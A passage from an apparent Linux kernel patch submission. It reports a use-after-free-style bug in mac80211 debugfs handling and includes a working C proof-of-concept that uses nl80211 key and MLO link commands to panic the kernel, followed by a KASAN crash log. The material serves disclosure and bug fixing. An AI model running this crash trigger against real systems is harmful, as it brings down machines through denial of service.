+    		return -NLE_MSGSIZE;
+    	}
+    
+    	err = nl_talk(sock, msg);
+    	nlmsg_free(msg);
+    	return err;
+    }
+    
+    static int new_key(struct nl_sock *sock, int family_id, int ifindex,
+    		   int key_idx, const void *key_data, size_t key_len)
+    {
+    	struct nl_msg *msg;
+    	int err;
+    
+    	msg = nlmsg_alloc();
+    	if (!msg)
+    		return -ENOMEM;
+    
+    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
+    			 NL80211_CMD_NEW_KEY, 0) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
+    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx) ||
+    	    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_WEP40) ||
+    	    nla_put(msg, NL80211_ATTR_KEY_DATA, key_len, key_data)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	err = nl_talk(sock, msg);
+    	nlmsg_free(msg);
+    	return err;
+    }
+    
+    static int set_default_key(struct nl_sock *sock, int family_id, int ifindex,
+    			   int key_idx, int link_id)
+    {
+    	struct nl_msg *msg;
+    	struct nlattr *types;
+    	int err;
+    
+    	msg = nlmsg_alloc();
+    	if (!msg)
+    		return -ENOMEM;
+    
+    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
+    			 NL80211_CMD_SET_KEY, 0) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
+    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx) ||
+    	    nla_put_flag(msg, NL80211_ATTR_KEY_DEFAULT)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	if (link_id >= 0 &&
+    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	types = nla_nest_start(msg, NL80211_ATTR_KEY_DEFAULT_TYPES);
+    	if (!types ||
+    	    nla_put_flag(msg, NL80211_KEY_DEFAULT_TYPE_UNICAST) ||
+    	    nla_put_flag(msg, NL80211_KEY_DEFAULT_TYPE_MULTICAST)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    	nla_nest_end(msg, types);
+    
+    	err = nl_talk(sock, msg);
+    	nlmsg_free(msg);
+    	return err;
+    }
+    
+    static int del_key(struct nl_sock *sock, int family_id, int ifindex,
+    		   int key_idx, int link_id)
+    {
+    	struct nl_msg *msg;
+    	int err;
+    
+    	msg = nlmsg_alloc();
+    	if (!msg)
+    		return -ENOMEM;
+    
+    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
+    			 NL80211_CMD_DEL_KEY, 0) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
+    	    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, key_idx)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	if (link_id >= 0 &&
+    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	err = nl_talk(sock, msg);
+    	nlmsg_free(msg);
+    	return err;
+    }
+    
+    static int add_link(struct nl_sock *sock, int family_id, int ifindex,
+    		    int link_id, const unsigned char link_addr[ETH_ALEN])
+    {
+    	struct nl_msg *msg;
+    	int err;
+    
+    	msg = nlmsg_alloc();
+    	if (!msg)
+    		return -ENOMEM;
+    
+    	if (!genlmsg_put(msg, NL_AUTO_PORT, NL_AUTO_SEQ, family_id, 0, 0,
+    			 NL80211_CMD_ADD_LINK, 0) ||
+    	    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifindex) ||
+    	    nla_put_u8(msg, NL80211_ATTR_MLO_LINK_ID, link_id) ||
+    	    nla_put(msg, NL80211_ATTR_MAC, ETH_ALEN, link_addr)) {
+    		nlmsg_free(msg);
+    		return -NLE_MSGSIZE;
+    	}
+    
+    	err = nl_talk(sock, msg);
+    	nlmsg_free(msg);
+    	return err;
+    }
+    
+    int main(int argc, char **argv)
+    {
+    	static const unsigned char wep40_key[] = { 0x11, 0x22, 0x33, 0x44, 0x55 };
+    	static const unsigned char link_addr[ETH_ALEN] = {
+    		0x02, 0x00, 0x00, 0x00, 0x10, 0x01
+    	};
+    	const char *ifname = argc > 1 ? argv[1] : "wlan0";
+    	struct nl_sock *sock;
+    	int family_id;
+    	int ifindex;
+    	int fd;
+    	int err;
+    
+    	ifindex = if_nametoindex(ifname);
+    	if (!ifindex) {
+    		fprintf(stderr, "if_nametoindex(%s): %s\n", ifname, strerror(errno));
+    		return 1;
+    	}
+    
+    	fd = open_ioctl_socket();
+    	if (fd < 0)
+    		return 1;
+    
+    	sock = nl_socket_alloc();
+    	if (!sock) {
+    		fprintf(stderr, "nl_socket_alloc failed\n");
+    		return 1;
+    	}
+    
+    	if (genl_connect(sock) < 0) {
+    		fprintf(stderr, "genl_connect failed\n");
+    		return 1;
+    	}
+    
+    	nl_socket_set_buffer_size(sock, 8192, 8192);
+    
+    	family_id = genl_ctrl_resolve(sock, "nl80211");
+    	if (family_id < 0) {
+    		fprintf(stderr, "genl_ctrl_resolve(nl80211) failed: %d\n", family_id);
+    		return 1;
+    	}
+    
+    	printf("requires a booted kernel with mac80211_hwsim MLO enabled, e.g. mac80211_hwsim.mlo=1\n");
+    
+    	printf("[1/7] bring %s down\n", ifname);
+    	if (set_if_updown(fd, ifname, false) < 0)
+    		return 1;
+    
+    	printf("[2/7] change %s into an AP interface\n", ifname);
+    	err = set_iftype(sock, family_id, ifindex, NL80211_IFTYPE_AP);
+    	if (err < 0) {
+    		fprintf(stderr, "NL80211_CMD_SET_INTERFACE failed: %s (%d)\n",
+    			nl_geterror(err), err);
+    		return 1;
+    	}
+    
+    	printf("[3/7] bring %s up\n", ifname);
+    	if (set_if_updown(fd, ifname, true) < 0)
+    		return 1;
+    
+    	printf("[4/7] add WEP40 group key idx 0\n");
+    	err = new_key(sock, family_id, ifindex, 0, wep40_key, sizeof(wep40_key));
+    	if (err < 0) {
+    		fprintf(stderr, "NL80211_CMD_NEW_KEY failed: %s (%d)\n",
+    			nl_geterror(err), err);
+    		return 1;
+    	}
+    
+    	printf("[5/7] set key idx 0 as the default key on the deflink\n");
+    	err = set_default_key(sock, family_id, ifindex, 0, -1);
+    	if (err < 0) {
+    		fprintf(stderr, "initial NL80211_CMD_SET_KEY failed: %s (%d)\n",
+    			nl_geterror(err), err);
+    		return 1;
+    	}
+    
+    	printf("[6/7] add MLO link 1; this recreates the netdev debugfs tree while the key stays alive\n");
+    	err = add_link(sock, family_id, ifindex, 1, link_addr);
+    	if (err < 0) {
+    		fprintf(stderr, "NL80211_CMD_ADD_LINK failed: %s (%d)\n",
+    			nl_geterror(err), err);
+    		return 1;
+    	}
+    
+    	usleep(200000);
+    
+    	printf("[7/7] set the same default key again on link 1; this should hit the stale debugfs dentry\n");
+    	err = set_default_key(sock, family_id, ifindex, 0, 1);
+    	if (err < 0) {
+    		fprintf(stderr, "second NL80211_CMD_SET_KEY failed: %s (%d)\n",
+    			nl_geterror(err), err);
+    		fprintf(stderr, "trying key deletion fallback\n");
+    		err = del_key(sock, family_id, ifindex, 0, 1);
+    		if (err < 0) {
+    			fprintf(stderr, "NL80211_CMD_DEL_KEY failed: %s (%d)\n",
+    				nl_geterror(err), err);
+    			return 1;
+    		}
+    	}
+    
+    	printf("kernel survived the full sequence\n");
+    	return 0;
+    }
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  250.656715][T10485] page last allocated via order 1, migratetype Reclaimable, gfp_mask 0xd20d0(__GFP_IO|__GFP_FS|__GFP_NOWARN|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC|__GFP_RECLAIMABLE), pid 9087, tgid 9087 (rasdaemon), ts 169450826143, free_ts 64359481277
+[  250.660265][T10485] page last free pid 1 tgid 1 stack trace:
+[  250.661411][T10485] Kernel panic - not syncing: KASAN: panic_on_warn set ...
+[  250.662509][T10485] CPU: 1 UID: 0 PID: 10485 Comm: poc Not tainted 6.12.95 #2
+[  250.663587][T10485] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  250.665366][T10485] Call Trace:
+[  250.665853][T10485]  <TASK>
+[  250.666291][T10485]  panic+0x533/0x610
+[  250.666881][T10485]  ? __pfx_panic+0x10/0x10
+[  250.667530][T10485]  ? rcu_is_watching+0x12/0xc0
+[  250.668241][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.669123][T10485]  ? __pfx_lock_release+0x10/0x10
+[  250.669854][T10485]  ? __pfx__printk+0x10/0x10
+[  250.670526][T10485]  ? print_report+0x2e5/0x620
+[  250.671212][T10485]  ? __lock_acquire+0x2f4e/0x3c40
+[  250.671949][T10485]  check_panic_on_warn+0x61/0x80
+[  250.672689][T10485]  end_report+0x11b/0x180
+[  250.673310][T10485]  kasan_report+0xe8/0x110
+[  250.673968][T10485]  ? __lock_acquire+0x2f4e/0x3c40
+[  250.674718][T10485]  __lock_acquire+0x2f4e/0x3c40
+[  250.675429][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.676214][T10485]  ? hlock_class+0x4e/0x130
+[  250.676883][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.677677][T10485]  ? __lock_acquire+0x1249/0x3c40
+[  250.678420][T10485]  ? __pfx___lock_acquire+0x10/0x10
+[  250.679171][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.679986][T10485]  ? hlock_class+0x4e/0x130
+[  250.680655][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.681465][T10485]  ? __lock_acquire+0xc96/0x3c40
+[  250.682184][T10485]  lock_acquire.part.0+0x119/0x370
+[  250.682923][T10485]  ? lockref_get+0xd/0x50
+[  250.683563][T10485]  ? __pfx_lock_acquire.part.0+0x10/0x10
+[  250.684384][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.685177][T10485]  ? rcu_is_watching+0x12/0xc0
+[  250.685869][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.686664][T10485]  ? trace_lock_acquire+0x145/0x1c0
+[  250.687409][T10485]  ? lockref_get+0xd/0x50
+[  250.688083][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.688927][T10485]  ? lock_acquire+0x2f/0xb0
+[  250.689580][T10485]  ? lockref_get+0xd/0x50
+[  250.690210][T10485]  _raw_spin_lock+0x33/0x40
+[  250.690979][T10485]  ? lockref_get+0xd/0x50
+[  250.691616][T10485]  lockref_get+0xd/0x50
+[  250.692302][T10485]  simple_recursive_removal+0x33/0x7e0
+[  250.693079][T10485]  ? __pfx_remove_one+0x10/0x10
+[  250.693786][T10485]  ? do_raw_spin_unlock+0x177/0x230
+[  250.694557][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.695389][T10485]  ? _raw_spin_unlock+0x2d/0x50
+[  250.696077][T10485]  debugfs_remove+0x44/0x70
+[  250.696737][T10485]  ieee80211_debugfs_key_update_default+0x11c/0x6a0
+[  250.697695][T10485]  ? __pfx_ieee80211_debugfs_key_update_default+0x10/0x10
+[  250.698728][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.699552][T10485]  ? rcu_is_watching+0x12/0xc0
+[  250.700230][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.701065][T10485]  ? __ieee80211_set_default_key+0x35d/0xa70
+[  250.701993][T10485]  ieee80211_config_default_key+0x4c/0x60
+[  250.702870][T10485]  nl80211_set_key+0x63d/0xd40
+[  250.703564][T10485]  ? __pfx_nl80211_set_key+0x10/0x10
+[  250.704324][T10485]  ? trace_kmalloc+0x2b/0xe0
+[  250.705022][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.705844][T10485]  ? nl80211_pre_doit+0x588/0x800
+[  250.706619][T10485]  genl_family_rcv_msg_doit+0x1e5/0x2d0
+[  250.707430][T10485]  ? __pfx_genl_family_rcv_msg_doit+0x10/0x10
+[  250.708323][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.709149][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.709962][T10485]  ? apparmor_capable+0xb9/0x180
+[  250.710597][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.711234][T10485]  ? security_capable+0x8a/0x150
+[  250.711814][T10485]  genl_rcv_msg+0x42d/0x6f0
+[  250.712365][T10485]  ? __pfx_genl_rcv_msg+0x10/0x10
+[  250.712971][T10485]  ? __pfx_nl80211_pre_doit+0x10/0x10
+[  250.713611][T10485]  ? __pfx_nl80211_set_key+0x10/0x10
+[  250.714219][T10485]  ? __pfx_nl80211_post_doit+0x10/0x10
+[  250.714895][T10485]  ? __pfx___lock_acquire+0x10/0x10
+[  250.715491][T10485]  ? find_held_lock+0x2d/0x110
+[  250.716050][T10485]  netlink_rcv_skb+0x136/0x370
+[  250.716619][T10485]  ? __pfx_genl_rcv_msg+0x10/0x10
+[  250.717222][T10485]  ? __pfx_lock_acquire.part.0+0x10/0x10
+[  250.717891][T10485]  ? __pfx_netlink_rcv_skb+0x10/0x10
+[  250.718500][T10485]  ? rwsem_read_trylock+0x130/0x250
+[  250.719080][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.719749][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.720433][T10485]  ? down_read+0xcc/0x330
+[  250.720936][T10485]  ? __pfx_down_read+0x10/0x10
+[  250.721492][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.722125][T10485]  ? netlink_deliver_tap+0x14b/0xa80
+[  250.722729][T10485]  genl_rcv+0x28/0x40
+[  250.723191][T10485]  netlink_unicast+0x479/0x790
+[  250.723764][T10485]  ? __pfx_netlink_unicast+0x10/0x10
+[  250.724368][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.725034][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.725686][T10485]  ? __check_object_size+0x2eb/0x4f0
+[  250.726295][T10485]  netlink_sendmsg+0x76e/0xc10
+[  250.726851][T10485]  ? __pfx_netlink_sendmsg+0x10/0x10
+[  250.727467][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.728101][T10485]  ? apparmor_socket_sendmsg+0x2e/0x200
+[  250.728749][T10485]  ____sys_sendmsg+0x818/0xa10
+[  250.729238][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.729626][T10485]  ? __pfx_____sys_sendmsg+0x10/0x10
+[  250.729986][T10485]  ? __pfx_copy_msghdr_from_user+0x10/0x10
+[  250.730394][T10485]  ? __lock_acquire+0x1249/0x3c40
+[  250.730740][T10485]  ___sys_sendmsg+0x105/0x190
+[  250.731059][T10485]  ? __pfx____sys_sendmsg+0x10/0x10
+[  250.731407][T10485]  ? debug_object_free+0x299/0x500
+[  250.731768][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.732134][T10485]  ? find_held_lock+0x2d/0x110
+[  250.732488][T10485]  ? __might_fault+0xb6/0x120
+[  250.732805][T10485]  __sys_sendmsg+0x122/0x1b0
+[  250.733121][T10485]  ? __pfx___sys_sendmsg+0x10/0x10
+[  250.733473][T10485]  ? srso_alias_return_thunk+0x5/0xfbef5
+[  250.733905][T10485]  do_syscall_64+0xc7/0x270
+[  250.734217][T10485]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  250.734638][T10485] RIP: 0033:0x7f5e8bcda687
+[  250.734937][T10485] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
+[  250.736229][T10485] RSP: 002b:00007ffc3d235470 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
+[  250.736810][T10485] RAX: ffffffffffffffda RBX: 00007f5e8bc49c40 RCX: 00007f5e8bcda687
+[  250.737343][T10485] RDX: 0000000000000000 RSI: 00007ffc3d2354f0 RDI: 0000000000000004
+[  250.737879][T10485] RBP: 000056101ab9d460 R08: 0000000000000000 R09: 0000000000000000
+[  250.738411][T10485] R10: 0000000000000000 R11: 0000000000000202 R12: 000056101ab9d2a0
+[  250.738964][T10485] R13: 00007ffc3d2354f0 R14: 0000000000000001 R15: 0000000000000000
+[  250.739503][T10485]  </TASK>
+[  250.739884][T10485] Kernel Offset: disabled
+[  250.740191][T10485] Rebooting in 86400 seconds..
+
+-----END crash log-----
+
+Best regards,
+Zhiling Zou
+
+Zhiling Zou (1):
+  wifi: mac80211: reset default-key debugfs after netdev recreate
+
+ net/mac80211/debugfs_netdev.c | 4 ++++
+ 1 file changed, 4 insertions(+)
+
+-- 
+2.43.0
